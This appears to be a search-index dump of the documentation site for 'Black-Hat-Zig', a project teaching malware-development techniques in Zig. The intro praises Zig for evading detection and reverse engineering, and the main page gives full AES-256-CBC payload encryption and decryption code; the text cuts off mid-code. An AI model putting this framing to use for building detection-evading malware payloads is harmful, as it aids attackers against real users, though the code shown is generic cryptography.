{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Black-Hat-Zig","text":"<p> Hello hackers. Hello maldevs. Hello reversers. Nice to see you here to explore the dark power of Zig! Maintained and managed by @CX330Blake </p>"},{"location":"#intro","title":"Intro","text":"<p>This project is continuously updating!</p> <p>This project provides many malware techniques implementation using Zig since I'm a huge fan of it. You can use this repo to weaponize Zig. Black-Hat-Zig is continuously updating to make sure it contains as more content as it could. It will be perfect if you want to create a PR for this project.</p> <p>Okay, let's hack the planet!</p>"},{"location":"#why-zig","title":"Why Zig?","text":"<ul> <li>\ud83e\udd1d Easy to interact with C/C++ source</li> <li>\ud83d\udd0e It's newer, so it's harder to be detect</li> <li>\ud83d\udcaa Strongly low level control, even lower than C</li> <li>\ud83d\ude31 It's harder to RE because of the modern compiler</li> <li>\ud83d\udee1\ufe0f Minimal runtime dependencies - No massive standard library footprint</li> <li>\ud83c\udfaf No undefined behavior - Explicit handling of edge cases prevents crashes</li> </ul>"},{"location":"#contributors","title":"Contributors","text":"<p>This project is mainly maintained &amp; managed by @CX330Blake. PRs are welcomed. Hope there's more people use Zig for malware developing so the ecosystem will be more mature.</p> <p>Huge thanks for these contributors!</p> <p> </p>"},{"location":"#credits-references","title":"Credits &amp; References","text":"<ul> <li>Maldev Academy</li> <li>OffensiveNim</li> </ul>"},{"location":"#star-history","title":"Star History","text":""},{"location":"#disclaimer","title":"Disclaimer","text":"<p>This project is for ethical and educational purpose only. Don't be a cyber criminal.</p>"},{"location":"epilogue/","title":"Epilogue","text":"<p>Thanks. If you like this repo please give a star!</p>"},{"location":"prologue/","title":"Before We Start","text":""},{"location":"prologue/#prerequisites","title":"Prerequisites","text":"<ul> <li>Windows environment<ul> <li>The code can be compiled on Linux/MacOS, but still need a Windows environment to execute</li> </ul> </li> <li>Zig &gt;= 0.14.0</li> <li>ZYPE installed<ul> <li>ZYPE is a tool we will often used here. To install, please visit ZYPE</li> </ul> </li> </ul>"},{"location":"prologue/#compiling-the-codes","title":"Compiling The Codes","text":"<p>The compilation is easy thanks to the good support for Zig's cross compilation. To build a Windows binary, we have three way to achieve it.</p> <ol> <li>Add <code>-Dtarget</code> flag to the <code>zig build</code> or <code>zig build-exe</code> command during the compilation.</li> <li>Simply run <code>zig-build</code> or <code>zig-build-exe</code> on a Windows machine.</li> <li>Set the default target architecture and OS in the <code>build.zig</code>.</li> </ol> <p>Here we'll use the third method to do this, so that no matter which OS you're using, you can simply run <code>zig build</code> to build the binary. For more details, this is the configuration I set for every projects that depend on Windows API.</p> <pre><code>const target = b.standardTargetOptions(.{ .default_target = .{\n    .cpu_arch = .x86_64,\n    .os_tag = .windows\n}});\n</code></pre>"},{"location":"prologue/#other-useful-tools","title":"Other Useful Tools","text":"<ul> <li>ZYRA: Your Runtime Armor<ul> <li>An executable packer written in Zig</li> </ul> </li> </ul>"},{"location":"Payload-Encryption/aes/","title":"AES Encryption","text":""},{"location":"Payload-Encryption/aes/#tldr","title":"TL;DR","text":"<p>See the code example</p>"},{"location":"Payload-Encryption/aes/#using-bcrypth","title":"Using bcrypt.h","text":"<p>bcrypt.h header - MSDN</p> main.zig<pre><code>const std = @import(\"std\");\nconst win = std.os.windows;\nconst kernel32 = win.kernel32;\n\nconst KEY_SIZE = 32;\nconst IV_SIZE = 16;\n\nconst DWORD = u32;\nconst BOOL = i32;\nconst PBYTE = [*]u8;\nconst PVOID = ?*anyopaque;\nconst ULONG = u32;\nconst NTSTATUS = i32;\n\nconst BCRYPT_BLOCK_PADDING = 0x00000001;\nconst STATUS_SUCCESS: NTSTATUS = 0;\n\nconst BCRYPT_AES_ALGORITHM = std.unicode.utf8ToUtf16LeStringLiteral(\"AES\");\nconst BCRYPT_CHAINING_MODE = std.unicode.utf8ToUtf16LeStringLiteral(\"ChainingMode\");\nconst BCRYPT_CHAIN_MODE_CBC = std.unicode.utf8ToUtf16LeStringLiteral(\"ChainingModeCBC\");\n\nconst AES = extern struct {\n    pPlainText: ?PBYTE,\n    dwPlainSize: DWORD,\n    pCipherText: ?PBYTE,\n    dwCipherSize: DWORD,\n    pKey: ?PBYTE,\n    pIv: ?PBYTE,\n};\n\nextern \"bcrypt\" fn BCryptOpenAlgorithmProvider(\n    phAlgorithm: *?*anyopaque,\n    pszAlgId: [*:0]const u16,\n    pszImplementation: ?[*:0]const u16,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptCloseAlgorithmProvider(\n    hAlgorithm: ?*anyopaque,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptGetProperty(\n    hObject: ?*anyopaque,\n    pszProperty: [*:0]const u16,\n    pbOutput: PBYTE,\n    cbOutput: ULONG,\n    pcbResult: *ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptSetProperty(\n    hObject: ?*anyopaque,\n    pszProperty: [*:0]const u16,\n    pbInput: PBYTE,\n    cbInput: ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptGenerateSymmetricKey(\n    hAlgorithm: ?*anyopaque,\n    phKey: *?*anyopaque,\n    pbKeyObject: PBYTE,\n    cbKeyObject: ULONG,\n    pbSecret: PBYTE,\n    cbSecret: ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptDestroyKey(hKey: ?*anyopaque) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptEncrypt(\n    hKey: ?*anyopaque,\n    pbInput: [*]u8,\n    cbInput: ULONG,\n    pPaddingInfo: ?*anyopaque,\n    pbIV: [*]u8,\n    cbIV: ULONG,\n    pbOutput: ?[*]u8,\n    cbOutput: ULONG,\n    pcbResult: *ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\nextern \"bcrypt\" fn BCryptDecrypt(\n    hKey: ?*anyopaque,\n    pbInput: [*]u8,\n    cbInput: ULONG,\n    pPaddingInfo: ?*anyopaque,\n    pbIV: [*]u8,\n    cbIV: ULONG,\n    pbOutput: ?[*]u8,\n    cbOutput: ULONG,\n    pcbResult: *ULONG,\n    dwFlags: ULONG,\n) callconv(.C) NTSTATUS;\n\n// Generate random bytes\nfn generateRandomBytes(buf: []u8) void {\n    var prng = std.Random.DefaultPrng.init(@as(u64, @bitCast(std.time.milliTimestamp())));\n    const rand = prng.random();\n    for (buf) |*b| b.* = rand.int(u8);\n}\n\n// Print a buffer as a C hex array\nfn printHexData(name: []const u8, data: []const u8) void {\n    std.debug.print(\"const {s} = [_]u8{{\", .{name});\n    var i: usize = 0;\n    for (data) |b| {\n        if (i % 16 == 0) std.debug.print(\"\\n\\t\", .{});\n        if (i &lt; data.len - 1) {\n            std.debug.print(\"0x{X:0&gt;2}, \", .{b});\n        } else {\n            std.debug.print(\"0x{X:0&gt;2} \", .{b});\n        }\n        i += 1;\n    }\n    std.debug.print(\"\\n}};\\n\\n\\n\", .{});\n}\n\nfn ntSuccess(status: NTSTATUS) bool {\n    return status &gt;= 0;\n}\n\n// Remove PKCS#7 padding from decrypted data\nfn removePkcs7Padding(data: []u8) ?[]u8 {\n    if (data.len == 0) return null;\n\n    const padding_length = data[data.len - 1];\n\n    // Validate padding length\n    if (padding_length == 0 or padding_length &gt; 16 or padding_length &gt; data.len) {\n        return null;\n    }\n\n    // Validate all padding bytes are the same\n    const start_index = data.len - padding_length;\n    for (data[start_index..]) |byte| {\n        if (byte != padding_length) {\n            return null;\n        }\n    }\n\n    return data[0..start_index];\n}\n\n// Encryption\nfn installAesEncryption(aes: *AES) bool {\n    var bSTATE: bool = true;\n    var hAlgorithm: ?*anyopaque = null;\n    var hKeyHandle: ?*anyopaque = null;\n\n    var cbResult: ULONG = 0;\n    var dwBlockSize: DWORD = 0;\n    var cbKeyObject: DWORD = 0;\n    var pbKeyObject: ?[*]u8 = null;\n    var pbCipherText: ?[*]u8 = null;\n    var cbCipherText: DWORD = 0;\n\n    var status: NTSTATUS = STATUS_SUCCESS;\n\n    blk: {\n        status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, null, 0);\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptOpenAlgorithmProvider Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"ObjectLength\"),\n            @ptrCast(&amp;cbKeyObject),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"BlockLength\"),\n            @ptrCast(&amp;dwBlockSize),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        if (dwBlockSize != 16) {\n            bSTATE = false;\n            break :blk;\n        }\n        pbKeyObject = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbKeyObject));\n        if (pbKeyObject == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptSetProperty(\n            hAlgorithm,\n            BCRYPT_CHAINING_MODE,\n            @ptrCast(@constCast(BCRYPT_CHAIN_MODE_CBC.ptr)),\n            @sizeOf(@TypeOf(BCRYPT_CHAIN_MODE_CBC)),\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptSetProperty Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGenerateSymmetricKey(\n            hAlgorithm,\n            &amp;hKeyHandle,\n            pbKeyObject.?,\n            cbKeyObject,\n            aes.pKey.?,\n            KEY_SIZE,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGenerateSymmetricKey Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptEncrypt(\n            hKeyHandle,\n            aes.pPlainText.?,\n            aes.dwPlainSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            null,\n            0,\n            &amp;cbCipherText,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptEncrypt[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        pbCipherText = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbCipherText));\n        if (pbCipherText == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptEncrypt(\n            hKeyHandle,\n            aes.pPlainText.?,\n            aes.dwPlainSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            pbCipherText,\n            cbCipherText,\n            &amp;cbResult,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptEncrypt[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n    }\n    if (hKeyHandle != null) _ = BCryptDestroyKey(hKeyHandle);\n    if (hAlgorithm != null) _ = BCryptCloseAlgorithmProvider(hAlgorithm, 0);\n    if (pbKeyObject != null) _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, pbKeyObject.?);\n    if (pbCipherText != null and bSTATE) {\n        aes.pCipherText = pbCipherText;\n        aes.dwCipherSize = cbCipherText;\n    }\n    return bSTATE;\n}\n\n// Decryption\nfn installAesDecryption(aes: *AES) bool {\n    var bSTATE: bool = true;\n    var hAlgorithm: ?*anyopaque = null;\n    var hKeyHandle: ?*anyopaque = null;\n\n    var cbResult: ULONG = 0;\n    var dwBlockSize: DWORD = 0;\n    var cbKeyObject: DWORD = 0;\n    var pbKeyObject: ?[*]u8 = null;\n    var pbPlainText: ?[*]u8 = null;\n    var cbPlainText: DWORD = 0;\n\n    var status: NTSTATUS = STATUS_SUCCESS;\n\n    blk: {\n        status = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, null, 0);\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptOpenAlgorithmProvider Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"ObjectLength\"),\n            @ptrCast(&amp;cbKeyObject),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGetProperty(\n            hAlgorithm,\n            std.unicode.utf8ToUtf16LeStringLiteral(\"BlockLength\"),\n            @ptrCast(&amp;dwBlockSize),\n            @sizeOf(DWORD),\n            &amp;cbResult,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGetProperty[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        if (dwBlockSize != 16) {\n            bSTATE = false;\n            break :blk;\n        }\n        pbKeyObject = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbKeyObject));\n        if (pbKeyObject == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptSetProperty(\n            hAlgorithm,\n            BCRYPT_CHAINING_MODE,\n            @ptrCast(@constCast(BCRYPT_CHAIN_MODE_CBC.ptr)),\n            @sizeOf(@TypeOf(BCRYPT_CHAIN_MODE_CBC)),\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptSetProperty Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptGenerateSymmetricKey(\n            hAlgorithm,\n            &amp;hKeyHandle,\n            pbKeyObject.?,\n            cbKeyObject,\n            aes.pKey.?,\n            KEY_SIZE,\n            0,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptGenerateSymmetricKey Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptDecrypt(\n            hKeyHandle,\n            aes.pCipherText.?,\n            aes.dwCipherSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            null,\n            0,\n            &amp;cbPlainText,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptDecrypt[1] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n        pbPlainText = @ptrCast(kernel32.HeapAlloc(kernel32.GetProcessHeap().?, 0, cbPlainText));\n        if (pbPlainText == null) {\n            bSTATE = false;\n            break :blk;\n        }\n        status = BCryptDecrypt(\n            hKeyHandle,\n            aes.pCipherText.?,\n            aes.dwCipherSize,\n            null,\n            aes.pIv.?,\n            IV_SIZE,\n            pbPlainText,\n            cbPlainText,\n            &amp;cbResult,\n            BCRYPT_BLOCK_PADDING,\n        );\n        if (!ntSuccess(status)) {\n            std.debug.print(\"[!] BCryptDecrypt[2] Failed With Error: 0x{X:0&gt;8}\\n\", .{status});\n            bSTATE = false;\n            break :blk;\n        }\n\n        // Remove PKCS#7 padding after successful decryption\n        if (pbPlainText != null and cbResult &gt; 0) {\n            const decrypted_data = pbPlainText.?[0..cbResult];\n            if (removePkcs7Padding(decrypted_data)) |unpadded| {\n                cbResult = @intCast(unpadded.len);\n            }\n        }\n    }\n    if (hKeyHandle != null) _ = BCryptDestroyKey(hKeyHandle);\n    if (hAlgorithm != null) _ = BCryptCloseAlgorithmProvider(hAlgorithm, 0);\n    if (pbKeyObject != null) _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, pbKeyObject.?);\n    if (pbPlainText != null and bSTATE) {\n        aes.pPlainText = pbPlainText;\n        aes.dwPlainSize = cbResult; // Use the adjusted size after padding removal\n    }\n    return bSTATE;\n}\n\n// Helper function to check if a many-item pointer is null-like\nfn isNullPtr(ptr: anytype) bool {\n    return @intFromPtr(ptr) == 0;\n}\n\n// Wrapper for encryption\nfn simpleEncryption(\n    pPlainTextData: [*]u8,\n    sPlainTextSize: u32,\n    pKey: [*]u8,\n    pIv: [*]u8,\n    pCipherTextData: *?[*]u8,\n    sCipherTextSize: *u32,\n) bool {\n    if (isNullPtr(pPlainTextData) or sPlainTextSize == 0 or isNullPtr(pKey) or isNullPtr(pIv))\n        return false;\n\n    var aes = AES{\n        .pKey = pKey,\n        .pIv = pIv,\n        .pPlainText = pPlainTextData,\n        .dwPlainSize = sPlainTextSize,\n        .pCipherText = null,\n        .dwCipherSize = 0,\n    };\n    if (!installAesEncryption(&amp;aes))\n        return false;\n    pCipherTextData.* = aes.pCipherText;\n    sCipherTextSize.* = aes.dwCipherSize;\n    return true;\n}\n\n// Wrapper for decryption\nfn simpleDecryption(\n    pCipherTextData: [*]u8,\n    sCipherTextSize: u32,\n    pKey: [*]u8,\n    pIv: [*]u8,\n    pPlainTextData: *?[*]u8,\n    sPlainTextSize: *u32,\n) bool {\n    if (isNullPtr(pCipherTextData) or sCipherTextSize == 0 or isNullPtr(pKey) or isNullPtr(pIv))\n        return false;\n\n    var aes = AES{\n        .pKey = pKey,\n        .pIv = pIv,\n        .pPlainText = null,\n        .dwPlainSize = 0,\n        .pCipherText = pCipherTextData,\n        .dwCipherSize = sCipherTextSize,\n    };\n    if (!installAesDecryption(&amp;aes))\n        return false;\n    pPlainTextData.* = aes.pPlainText;\n    sPlainTextSize.* = aes.dwPlainSize;\n    return true;\n}\n\npub fn main() !void {\n    // --- DECRYPTION PART EXAMPLE ---\n    std.debug.print(\"--- DECRYPTION PART EXAMPLE ---\\n\\n\", .{});\n    var p_key = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46, 0x9E, 0xD0, 0x73, 0x1E, 0x7C, 0x8B, 0xCB, 0x72, 0xD9, 0x88, 0x01, 0x5F, 0xE3, 0x7B, 0x33, 0x63 };\n    var p_iv = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46 };\n    var ciphertext = [_]u8{ 0xBB, 0xF4, 0x2D, 0x43, 0x41, 0x72, 0x46, 0x6C, 0x9F, 0xE7, 0xF8, 0xF3, 0x49, 0xAF, 0x83, 0x69, 0xA5, 0x38, 0xBD, 0x0E, 0x56, 0x84, 0xF6, 0x6D, 0x88, 0x72, 0x26, 0x32, 0x5D, 0xBE, 0x1C, 0x70, 0xB4, 0x42, 0xAE, 0xBC, 0x70, 0x07, 0x87, 0x0C, 0x19, 0x5A, 0x79, 0xB2, 0x4B, 0x88, 0x83, 0xA9, 0x6C, 0x3A, 0xF8, 0x7B, 0x1E, 0x37, 0xD8, 0xAF, 0x36, 0x66, 0x30, 0x27, 0xFA, 0xE4, 0x80, 0x60 };\n    var p_plaintext: ?[*]u8 = null;\n    var dw_plain_size: u32 = 0;\n\n    if (!simpleDecryption(ciphertext[0..].ptr, ciphertext.len, p_key[0..].ptr, p_iv[0..].ptr, &amp;p_plaintext, &amp;dw_plain_size)) {\n        std.debug.print(\"Decryption failed!\\n\", .{});\n        return;\n    }\n    printHexData(\"p_key\", p_key[0..]);\n    printHexData(\"p_iv\", p_iv[0..]);\n    printHexData(\"ciphertext\", ciphertext[0..]);\n    printHexData(\"PlainTextInBytes\", p_plaintext.?[0..dw_plain_size]);\n    std.debug.print(\"PlainTextDecoded: {s}\\n\\n\", .{p_plaintext.?[0..dw_plain_size]});\n    _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, p_plaintext.?);\n\n    // --- ENCRYPTION PART EXAMPLE ---\n    std.debug.print(\"--- ENCRYPTION PART EXAMPLE ---\\n\\n\", .{});\n    var plaintext_data = [_]u8{ 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x73, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x20, 0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64, 0x2e, 0x20, 0x50, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x20, 0x67, 0x69, 0x76, 0x65, 0x20, 0x42, 0x6c, 0x61, 0x63, 0x6b, 0x2d, 0x48, 0x61, 0x74, 0x2d, 0x5a, 0x69, 0x67, 0x20, 0x61, 0x20, 0x73, 0x74, 0x61, 0x72, 0x21 };\n    var key = [_]u8{0} ** KEY_SIZE;\n    var iv = [_]u8{0} ** IV_SIZE;\n    generateRandomBytes(key[0..]);\n    generateRandomBytes(iv[0..]);\n    printHexData(\"pKey\", key[0..]);\n    printHexData(\"pIv\", iv[0..]);\n    printHexData(\"PlainTextInBytes\", plaintext_data[0..]);\n    std.debug.print(\"PlainTextDecoded: {s}\\n\\n\", .{plaintext_data[0..]});\n    var p_ciphertext: ?[*]u8 = null;\n    var dw_cipher_size: u32 = 0;\n    if (!simpleEncryption(plaintext_data[0..].ptr, plaintext_data.len, key[0..].ptr, iv[0..].ptr, &amp;p_ciphertext, &amp;dw_cipher_size)) {\n        std.debug.print(\"Encryption failed!\\n\", .{});\n        return;\n    }\n    printHexData(\"CipherText\", p_ciphertext.?[0..dw_cipher_size]);\n    _ = kernel32.HeapFree(kernel32.GetProcessHeap().?, 0, p_ciphertext.?);\n}\n</code></pre>"},{"location":"Payload-Encryption/aes/#using-standard-library","title":"Using Standard Library","text":"main.zig<pre><code>const std = @import(\"std\");\nconst crypto = std.crypto;\nconst Aes256 = crypto.core.aes.Aes256;\nconst print = std.debug.print;\n\nconst KEY_SIZE = 32;\nconst IV_SIZE = 16;\nconst BLOCK_SIZE = 16;\n\n// Generate random bytes\nfn generateRandomBytes(buf: []u8) !void {\n    var prng = std.Random.DefaultPrng.init(@as(u64, @bitCast(std.time.milliTimestamp())));\n    const rand = prng.random();\n    for (buf) |*b| b.* = rand.int(u8);\n}\n\n// Print a buffer as a hex array\nfn printHexData(name: []const u8, data: []const u8) void {\n    print(\"const {s} = [_]u8{{\", .{name});\n    var i: usize = 0;\n    for (data) |b| {\n        if (i % 16 == 0) print(\"\\n\\t\", .{});\n        if (i &lt; data.len - 1) {\n            print(\"0x{X:0&gt;2}, \", .{b});\n        } else {\n            print(\"0x{X:0&gt;2} \", .{b});\n        }\n        i += 1;\n    }\n    print(\"\\n}};\\n\\n\", .{});\n}\n\n// Add PKCS#7 padding\nfn addPkcs7Padding(allocator: std.mem.Allocator, data: []const u8) ![]u8 {\n    const padding_needed = BLOCK_SIZE - (data.len % BLOCK_SIZE);\n    const padded_size = data.len + padding_needed;\n\n    var padded_data = try allocator.alloc(u8, padded_size);\n    @memcpy(padded_data[0..data.len], data);\n\n    // Fill padding bytes with the padding length value\n    @memset(padded_data[data.len..], @intCast(padding_needed));\n\n    return padded_data;\n}\n\n// Remove PKCS#7 padding\nfn removePkcs7Padding(allocator: std.mem.Allocator, data: []const u8) ![]u8 {\n    if (data.len == 0) return error.InvalidPadding;\n\n    const padding_length = data[data.len - 1];\n\n    // Validate padding length\n    if (padding_length == 0 or padding_length &gt; BLOCK_SIZE or padding_length &gt; data.len) {\n        return error.InvalidPadding;\n    }\n\n    // Validate all padding bytes are the same\n    const start_index = data.len - padding_length;\n    for (data[start_index..]) |byte| {\n        if (byte != padding_length) {\n            return error.InvalidPadding;\n        }\n    }\n\n    // Return unpadded data\n    const unpadded = try allocator.alloc(u8, start_index);\n    @memcpy(unpadded, data[0..start_index]);\n    return unpadded;\n}\n\n// AES-256-CBC Encryption\nfn aesEncrypt(allocator: std.mem.Allocator, plaintext: []const u8, key: []const u8, iv: []const u8) ![]u8 {\n    if (key.len != KEY_SIZE) return error.InvalidKeySize;\n    if (iv.len != IV_SIZE) return error.InvalidIvSize;\n\n    // Add PKCS#7 padding\n    const padded_plaintext = try addPkcs7Padding(allocator, plaintext);\n    defer allocator.free(padded_plaintext);\n\n    // Initialize AES context\n    const aes_ctx = Aes256.initEnc(key[0..32].*);\n\n    // Allocate memory for ciphertext\n    var ciphertext = try allocator.alloc(u8, padded_plaintext.len);\n\n    // Copy IV to working buffer\n    var working_iv: [IV_SIZE]u8 = undefined;\n    @memcpy(&amp;working_iv, iv[0..IV_SIZE]);\n\n    // Encrypt in CBC mode\n    var i: usize = 0;\n    while (i &lt; padded_plaintext.len) : (i += BLOCK_SIZE) {\n        // Prepare block for encryption\n        var block: [BLOCK_SIZE]u8 = undefined;\n\n        // XOR with IV/previous ciphertext block\n        for (0..BLOCK_SIZE) |j| {\n            block[j] = padded_plaintext[i + j] ^ working_iv[j];\n        }\n\n        // Encrypt the block\n        var encrypted_block: [BLOCK_SIZE]u8 = undefined;\n        aes_ctx.encrypt(&amp;encrypted_block, &amp;block);\n\n        // Copy encrypted block to ciphertext\n        @memcpy(ciphertext[i .. i + BLOCK_SIZE], &amp;encrypted_block);\n\n        // Update IV with current ciphertext block for next iteration\n        @memcpy(&amp;working_iv, &amp;encrypted_block);\n    }\n\n    return ciphertext;\n}\n\n// AES-256-CBC Decryption\nfn aesDecrypt(allocator: std.mem.Allocator, ciphertext: []const u8, key: []const u8, iv: []const u8) ![]u8 {\n    if (key.len != KEY_SIZE) return error.InvalidKeySize;\n    if (iv.len != IV_SIZE) return error.InvalidIvSize;\n    if (ciphertext.len % BLOCK_SIZE != 0) return error.InvalidCiphertextLength;\n\n    // Initialize AES context for decryption\n    const aes_ctx = Aes256.initDec(key[0..32].*);\n\n    // Allocate memory for plaintext\n    var plaintext = try allocator.alloc(u8, ciphertext.len);\n\n    // Copy IV to working buffer\n    var working_iv: [IV_SIZE]u8 = undefined;\n    @memcpy(&amp;working_iv, iv[0..IV_SIZE]);\n\n    // Decrypt in CBC mode\n    var i: usize = 0;\n    while (i &lt; ciphertext.len) : (i += BLOCK_SIZE) {\n        // Get current ciphertext block\n        var cipher_block: [BLOCK_SIZE]u8 = undefined;\n        @memcpy(&amp;cipher_block, ciphertext[i .. i + BLOCK_SIZE]);\n\n        // Decrypt the block\n        var decrypted_block: [BLOCK_SIZE]u8 = undefined;\n        aes_ctx.decrypt(&amp;decrypted_block, &amp;cipher_block);\n\n        // XOR with IV/previous ciphertext block\n        for (0..BLOCK_SIZE) |j| {\n            plaintext[i + j] = decrypted_block[j] ^ working_iv[j];\n        }\n\n        // Update IV with current ciphertext block for next iteration\n        @memcpy(&amp;working_iv, &amp;cipher_block);\n    }\n\n    // Remove PKCS#7 padding\n    const unpadded = try removePkcs7Padding(allocator, plaintext);\n    allocator.free(plaintext); // Free the padded version\n    return unpadded;\n}\n\n// Simple encryption wrapper\nfn simpleEncryption(\n    allocator: std.mem.Allocator,\n    plaintext_data: []const u8,\n    key: []const u8,\n    iv: []const u8,\n) ![]u8 {\n    return aesEncrypt(allocator, plaintext_data, key, iv);\n}\n\n// Simple decryption wrapper\nfn simpleDecryption(\n    allocator: std.mem.Allocator,\n    ciphertext_data: []const u8,\n    key: []const u8,\n    iv: []const u8,\n) ![]u8 {\n    return aesDecrypt(allocator, ciphertext_data, key, iv);\n}\n\npub fn main() !void {\n    var gpa = std.heap.GeneralPurposeAllocator(.{}){};\n    defer _ = gpa.deinit();\n    const allocator = gpa.allocator();\n\n    // --- DECRYPTION PART EXAMPLE ---\n    print(\"--- DECRYPTION PART EXAMPLE ---\\n\\n\", .{});\n\n    const p_key = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46, 0x9E, 0xD0, 0x73, 0x1E, 0x7C, 0x8B, 0xCB, 0x72, 0xD9, 0x88, 0x01, 0x5F, 0xE3, 0x7B, 0x33, 0x63 };\n    const p_iv = [_]u8{ 0xEB, 0x40, 0x6D, 0x51, 0x9A, 0x15, 0x71, 0xBF, 0x9F, 0x61, 0xA4, 0x1A, 0x0A, 0x6A, 0x3B, 0x46 };\n    const ciphertext = [_]u8{ 0xBB, 0xF4, 0x2D, 0x43, 0x41, 0x72, 0x46, 0x6C, 0x9F, 0xE7, 0xF8, 0xF3, 0x49, 0xAF, 0x83, 0x69, 0xA5, 0x38, 0xBD, 0x0E, 0x56, 0x84, 0xF6, 0x6D, 0x88, 0x72, 0x26, 0x32, 0x5D, 0xBE, 0x1C, 0x70, 0xB4, 0x42, 0xAE, 0xBC, 0x70, 0x07, 0x87, 0x0C, 0x19, 0x5A, 0x79, 0xB2, 0x4B, 0x88, 0x83, 0xA9, 0x6C, 0x3A, 0xF8, 0x7B, 0x1E, 0x37, 0xD8, 0xAF, 0x36, 0x66, 0x30, 0x27, 0xFA, 0xE4, 0x80, 0x60 };\n\n    const p_plaintext = simpleDecryption(allocator, &amp;ciphertext, &amp;p_key, &amp;p_iv) catch |err| {\n        print(\"Decryption failed: {}\\n\", .{err});\n        return;\n    